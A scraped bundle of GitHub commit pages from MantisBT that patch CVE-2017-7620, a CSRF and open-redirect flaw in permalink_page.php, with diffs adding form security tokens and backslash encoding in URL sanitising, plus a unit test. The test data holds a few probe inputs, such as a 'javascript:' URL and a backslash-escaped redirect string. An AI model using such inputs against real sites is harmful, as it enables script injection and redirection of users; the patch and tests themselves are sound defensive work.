Become an open source partner and support the tools and libraries that power your work.

A GitHub Sponsors popup displays ‘$15,000 a month’ with a progress bar showing 87% towards a $15,000 goal.[Dive into GitHub Sponsors](/sponsors)
## From startups to enterprises, GitHub scales with teams of any size in any industry.

By industryBy sizeBy use caseBy industry

---

[![](https://github.githubassets.com/assets/figma-62d390a52419.webp)![Figma](https://github.githubassets.com/assets/figma-9b0c642e96b8.svg)Technology

Figma streamlines development and strengthens security

Read customer story](https://github.com/customer-stories/figma)[![](https://github.githubassets.com/assets/mercedes-benz-d8f89b041561.webp)![Mercedes-Benz](https://github.githubassets.com/assets/mercedes-benz-60ddd54043e7.svg)Automotive

Mercedes-Benz standardizes source code and automates onboarding

Read customer story](https://github.com/customer-stories/mercedes-benz)[![](https://github.githubassets.com/assets/mercado-libre-579cb5447302.webp)![Mercado Libre](https://github.githubassets.com/assets/mercado-libre-2d6d610fa873.svg)Financial services

Mercado Libre cuts coding time by 50%

Read customer story](https://github.com/customer-stories/mercado-libre)[Explore customer stories](/customer-stories)

---

[View all solutions](/solutions)
## Millions of developers and businesses call GitHub home

Whether you’re scaling your development process or just learning how to code, GitHub is where you belong. Join the world’s most widely adopted AI-powered developer platform to build the technologies that redefine what’s possible.

Enter your emailSign up for GitHub[Try GitHub Copilot](/features/copilot)
## Footnotes

1. [Survey: The AI wave continues to grow on software development teams, 2024.](https://github.blog/news-insights/research/survey-ai-wave-grows/)
2. This 7X times factor is based on data from the industry’s longest running analysis of fix rates Veracode State of Software Security 2023, which cites the average time to fix 50% of flaws as 198 days vs. GitHub’s fix rates of 72% of flaws with in 28 days which is at a minimum of 7X faster when compared.

## Site-wide Links

### Subscribe to our developer newsletter

Get tips, technical guides, and best practices. Twice a month. Right in your inbox.

[Subscribe](https://resources.github.com/newsletter/)

### Product

* [Features](/features)
* [Enterprise](/enterprise)
* [Copilot](/features/copilot)
* [Security](/security)
* [Pricing](/pricing)
* [Team](/team)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare)

### Platform

* [Developer API](https://docs.github.com/get-started/exploring-integrations/about-building-integrations)
* [Partners](https://partner.github.com)
* [Education](https://github.com/edu)
* [GitHub CLI](https://cli.github.com)
* [GitHub Desktop](https://desktop.github.com)
* [GitHub Mobile](https://github.com/mobile)

### Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com)
* [Premium Support](/enterprise/premium-support)
* [Skills](https://skills.github.com)
* [Status](https://www.githubstatus.com)
* [Contact GitHub](https://support.github.com?tags=dotcom-footer)

### Company

* [About](https://github.com/about)
* [Customer stories](/customer-stories?type=enterprise)
* [Blog](https://github.blog)
* [The ReadME Project](/readme)
* [Careers](https://github.careers)
* [Newsroom](/newsroom)
* [Inclusion](/about/diversity)
* [Social Impact](https://socialimpact.github.com)
* [Shop](https://shop.github.com)

* © 2025 GitHub, Inc.
* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
  ([Updated 02/2024](https://github.com/github/site-policy/pull/582))
* [Sitemap](/sitemap)
* [What is Git?](/git-guides)
* Manage cookies
* Do not share my personal information

* [GitHub on LinkedIn](https://www.linkedin.com/company/github)
* [Instagram
  GitHub on Instagram](https://www.instagram.com/github)
* [GitHub on YouTube](https://www.youtube.com/github)
* [GitHub on X](https://x.com/github)
* [TikTok
  GitHub on TikTok](https://www.tiktok.com/%40github)
* [Twitch
  GitHub on Twitch](https://www.twitch.tv/github)
* [GitHub’s organization on GitHub](https://github.com/github)

You can’t perform that action at this time.



=== Content from github.com_60825aa3_20250126_031543.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Fc4f50e5df6b189abb1d717a5f7dbab5cbfef8165)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Fc4f50e5df6b189abb1d717a5f7dbab5cbfef8165)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mantisbt%2Fmantisbt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mantisbt](/mantisbt)
/
**[mantisbt](/mantisbt/mantisbt)**
Public

* [Notifications](/login?return_to=%2Fmantisbt%2Fmantisbt) You must be signed in to change notification settings
* [Fork
  728](/login?return_to=%2Fmantisbt%2Fmantisbt)
* [Star
   1.7k](/login?return_to=%2Fmantisbt%2Fmantisbt)

* [Code](/mantisbt/mantisbt)
* [Pull requests
  80](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

Additional navigation options

* [Code](/mantisbt/mantisbt)
* [Pull requests](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

## Commit

[Permalink](/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix CSRF vulnerability in permalink\_page.php

[Browse files](/mantisbt/mantisbt/tree/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165)
Browse the repository at this point in the history

```
John Page aka hyp3rlinx / ApparitionSec <http://hyp3rlinx.altervista.org>
reported a CSRF vulnerability in permalink_page.php, allowing an
attacker to inject arbitrary links ([CVE-2017-7620](https://github.com/advisories/GHSA-9x76-mp7r-2xc5 "CVE-2017-7620")).

Backporting from master branch:
- Add form security token to prevent such injection (code changed from
  original commit) 0d11077d40c5dfdb76efdad9ba2b455af5be25a0
- Encode '\' in string_sanitize_url()
  7b23377c573817c5fe8b522e8c33de8b1caff179

Fixes #22702, #22816
```

* Loading branch information

[![@dregad](https://avatars.githubusercontent.com/u/449891?s=40&v=4)](/dregad)

[dregad](/mantisbt/mantisbt/commits?author=dregad "View all commits by dregad")
committed
May 20, 2017

1 parent
[b933abc](/mantisbt/mantisbt/commit/b933abcbf3625bb658a865ed573a7ff87c49c0f8)

commit c4f50e5

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**12 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* core

  + core/filter\_api.php
    [filter\_api.php](#diff-184c543668cedb4bce5a49727bb356c783df1b51e6bb8a7c2e55047650fbdb21)
  + core/string\_api.php
    [string\_api.php](#diff-e8b6d7d95d93f7f63a37c713cc93be7a9426d5bfd629b9efc00f39cc4f0df0e4)
* permalink\_page.php
  [permalink\_page.php](#diff-41f8fbfcde979e6ee4cd5f9eaf18455ca3893de723aca695903c4d7b3fb34a95)
* tests/Mantis

  + tests/Mantis/StringTest.php
    [StringTest.php](#diff-7c3b1d224688ff4512e175b2c9e39583cce2734929b0dd853f17546b7bd8df4a)

## There are no files selected for viewing

4 changes: 3 additions & 1 deletion

4
[core/filter\_api.php](#diff-184c543668cedb4bce5a49727bb356c783df1b51e6bb8a7c2e55047650fbdb21 "core/filter_api.php")

Show comments

[View file](/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/core/filter_api.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3615,7 +3615,9 @@ function filter\_draw\_selection\_area2( $p\_page\_number, $p\_for\_screen = true, $p\_e |
|  |  | if( access\_has\_project\_level( config\_get( 'create\_permalink\_threshold' ) ) ) { |
|  |  | ?> |
|  |  | <form method="get" action="permalink\_page.php"> |
|  |  | <?php # CSRF protection not required here - form does not result in modifications ?> |
|  |  | <?php # Add CSRF protection, see #22702 |
|  |  | echo form\_security\_field( 'permalink' ); |
|  |  | ?> |
|  |  | <input type="hidden" name="url" value="<?php echo urlencode( filter\_get\_url( $t\_filter ) ) ?>" /> |
|  |  | <input type="submit" name="reset\_query\_button" class="button-small" value="<?php echo lang\_get( 'create\_filter\_link' ) ?>" /> |
|  |  | </form> |
| Expand Down | |  |

4 changes: 3 additions & 1 deletion

4
[core/string\_api.php](#diff-e8b6d7d95d93f7f63a37c713cc93be7a9426d5bfd629b9efc00f39cc4f0df0e4 "core/string_api.php")

Show comments

[View file](/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/core/string_api.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -275,7 +275,9 @@ function string\_sanitize\_url( $p\_url, $p\_return\_absolute = false ) { |
|  |  | } |
|  |  |  |
|  |  | # Start extracting regex matches |
|  |  | $t\_script = $t\_matches['script']; |
|  |  | # Encode backslashes to prevent unwanted escaping of a leading '/' allowing |
|  |  | # redirection to external sites |
|  |  | $t\_script = strtr( $t\_matches['script'], array( '\\' => '%5C' ) ); |
|  |  | $t\_script\_path = $t\_matches['path']; |
|  |  |  |
|  |  | # Clean/encode query params |
| Expand Down | |  |

5 changes: 5 additions & 0 deletions

5
[permalink\_page.php](#diff-41f8fbfcde979e6ee4cd5f9eaf18455ca3893de723aca695903c4d7b3fb34a95 "permalink_page.php")

Show comments

[View file](/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/permalink_page.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,15 +36,19 @@ |
|  |  | require\_once( 'core.php' ); |
|  |  | require\_api( 'access\_api.php' ); |
|  |  | require\_api( 'config\_api.php' ); |
|  |  | require\_api( 'form\_api.php' ); |
|  |  | require\_api( 'gpc\_api.php' ); |
|  |  | require\_api( 'html\_api.php' ); |
|  |  | require\_api( 'lang\_api.php' ); |
|  |  | require\_api( 'print\_api.php' ); |
|  |  | require\_api( 'string\_api.php' ); |
|  |  | require\_api( 'utility\_api.php' ); |
|  |  |  |
|  |  | form\_security\_validate( 'permalink' ); |
|  |  |  |
|  |  | html\_page\_top(); |
|  |  |  |
|  |  |  |
|  |  | access\_ensure\_project\_level( config\_get( 'create\_permalink\_threshold' ) ); |
|  |  |  |
|  |  | $f\_url = string\_sanitize\_url( gpc\_get\_string( 'url' ) ); |
| Expand All | | @@ -64,4 +68,5 @@ |
|  |  | ?> |
|  |  | </div> |
|  |  | <?php |
|  |  | form\_security\_purge( 'permalink' ); |
|  |  | html\_page\_bottom(); |

1 change: 1 addition & 0 deletions

1
[tests/Mantis/StringTest.php](#diff-7c3b1d224688ff4512e175b2c9e39583cce2734929b0dd853f17546b7bd8df4a "tests/Mantis/StringTest.php")

Show comments

[View file](/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/tests/Mantis/StringTest.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -82,6 +82,7 @@ public function provider() { |
|  |  | array( 'plugin.php?page=Source/list&id=1#abc', 'plugin.php?page=Source%2Flist&id=1#abc'), |
|  |  | array( 'login\_page.php?return=http://google.com/', 'index.php'), |
|  |  | array( 'javascript:alert(1);', 'index.php'), |
|  |  | array( '\/csrf-22702', '%5C/csrf-22702' ), |
|  |  | ); |
|  |  |  |
|  |  | # @FIXME |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `c4f50e5`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Fc4f50e5df6b189abb1d717a5f7dbab5cbfef8165) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from mantisbt.org_1ef8a5fc_20250126_031504.html ===

Toggle sidebar [MantisBT](/bugs//) Toggle user menu

* mantisbt

  + - [All Projects](/bugs/set_project.php?project_id=0)
    - [mantisbt](/bugs/set_project.php?project_id=1)
    - [Mylyn Connector](/bugs/set_project.php?project_id=20)
    - [Plugin - agileMantis](/bugs/set_project.php?project_id=25)
    - [Plugin - CsvImport](/bugs/set_project.php?project_id=11)
    - [Plugin - CustomerManagement](/bugs/set_project.php?project_id=21)
    - [Plugin - EmailReporting](/bugs/set_project.php?project_id=10)
    - [Plugin - FilterPageEdit](/bugs/set_project.php?project_id=15)
    - [Plugin - InlineColumnConfiguration](/bugs/set_project.php?project_id=14)
    - [Plugin - LinkedCustomFields](/bugs/set_project.php?project_id=16)
    - [Plugin - MantisTouchRedirect](/bugs/set_project.php?project_id=22)
    - [Plugin - RecurrCall](/bugs/set_project.php?project_id=6)
    - [Plugin - RelatedIssuesExport](/bugs/set_project.php?project_id=13)
    - [Plugin - Reminder](/bugs/set_project.php?project_id=7)
    - [Plugin - Tasks](/bugs/set_project.php?project_id=8)
    - [Plugin - Time Tracking](/bugs/set_project.php?project_id=18)
* anonymous
  + [RSS](https://mantisbt.org/bugs/issues_rss.php)
  + [Logout](/bugs/logout_page.php)

* [My View](/bugs/my_view_page.php)
* [View Issues](/bugs/view_all_bug_page.php)
* [Change Log](/bugs/changelog_page.php)
* [Roadmap](/bugs/roadmap_page.php)
* [Wiki](/bugs/wiki.php?type=project&id=1)
* [Repositories](/bugs/plugin.php?page=Source/index)

* Anonymous
[Login](/bugs/login_page.php?return=%2Fbugs%2Fview_user_page.php%3Fid%3D42531)
[Signup for a new account](/bugs/signup_page.php)

#### User Information

| Username | hyp3rlinx |
| --- | --- |

**Powered by [MantisBT 2.28.0-dev-master-f0c253853](https://www.mantisbt.org "bug tracking software")**

Copyright © 2000 - 2025 MantisBT Team
Contact administrator for assistance

[![Powered by Mantis Bug Tracker: a free and open source web based bug tracking system.](/bugs/images/mantis_logo.png)](https://www.mantisbt.org "Mantis Bug Tracker: a free and open source web based bug tracking system.")

 Page execution time: 0.1902 seconds



=== Content from github.com_3250948b_20250126_031537.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Ff66440902877103f312905257dbccdad0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Ff66440902877103f312905257dbccdad0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mantisbt%2Fmantisbt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mantisbt](/mantisbt)
/
**[mantisbt](/mantisbt/mantisbt)**
Public

* [Notifications](/login?return_to=%2Fmantisbt%2Fmantisbt) You must be signed in to change notification settings
* [Fork
  728](/login?return_to=%2Fmantisbt%2Fmantisbt)
* [Star
   1.7k](/login?return_to=%2Fmantisbt%2Fmantisbt)

* [Code](/mantisbt/mantisbt)
* [Pull requests
  80](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

Additional navigation options

* [Code](/mantisbt/mantisbt)
* [Pull requests](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

## Commit

[Permalink](/mantisbt/mantisbt/commit/f66440902877103f312905257dbccdad02ab5a3b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Encode '\' in string\_sanitize\_url()

[Browse files](/mantisbt/mantisbt/tree/f66440902877103f312905257dbccdad02ab5a3b)
Browse the repository at this point in the history

```
As an extra safety measure following up on the fix for [CVE-2017-7620](https://github.com/advisories/GHSA-9x76-mp7r-2xc5 "CVE-2017-7620"), we
encode the backslashes in the 'script' part of the URL to ensure that
the sanitized URL is treated as a path relative to MantisBT root and not
a link to an external site if the URL begins with an escaped `/`.

This reduces the risk of someone being able to use the same attack
vector in another page.

Fixes #22702, #22816
```

* Loading branch information

[![@dregad](https://avatars.githubusercontent.com/u/449891?s=40&v=4)](/dregad)

[dregad](/mantisbt/mantisbt/commits?author=dregad "View all commits by dregad")
committed
May 20, 2017

1 parent
[f21b56f](/mantisbt/mantisbt/commit/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2)

commit f664409

Showing
**1 changed file**
with
**3 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

4 changes: 3 additions & 1 deletion

4
[core/string\_api.php](#diff-e8b6d7d95d93f7f63a37c713cc93be7a9426d5bfd629b9efc00f39cc4f0df0e4 "core/string_api.php")

Show comments

[View file](/mantisbt/mantisbt/blob/f66440902877103f312905257dbccdad02ab5a3b/core/string_api.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -275,7 +275,9 @@ function string\_sanitize\_url( $p\_url, $p\_return\_absolute = false ) { |
|  |  | } |
|  |  |  |
|  |  | # Start extracting regex matches |
|  |  | $t\_script = $t\_matches['script']; |
|  |  | # Encode backslashes to prevent unwanted escaping of a leading '/' allowing |
|  |  | # redirection to external sites |
|  |  | $t\_script = strtr( $t\_matches['script'], array( '\\' => '%5C' ) ); |
|  |  | $t\_script\_path = $t\_matches['path']; |
|  |  |  |
|  |  | # Clean/encode query params |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f664409`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Ff66440902877103f312905257dbccdad0) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_b95851ab_20250126_031539.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Ff66440902877103f312905257dbccdad02ab5a3b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Ff66440902877103f312905257dbccdad02ab5a3b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mantisbt%2Fmantisbt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mantisbt](/mantisbt)
/
**[mantisbt](/mantisbt/mantisbt)**
Public

* [Notifications](/login?return_to=%2Fmantisbt%2Fmantisbt) You must be signed in to change notification settings
* [Fork
  728](/login?return_to=%2Fmantisbt%2Fmantisbt)
* [Star
   1.7k](/login?return_to=%2Fmantisbt%2Fmantisbt)

* [Code](/mantisbt/mantisbt)
* [Pull requests
  80](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

Additional navigation options

* [Code](/mantisbt/mantisbt)
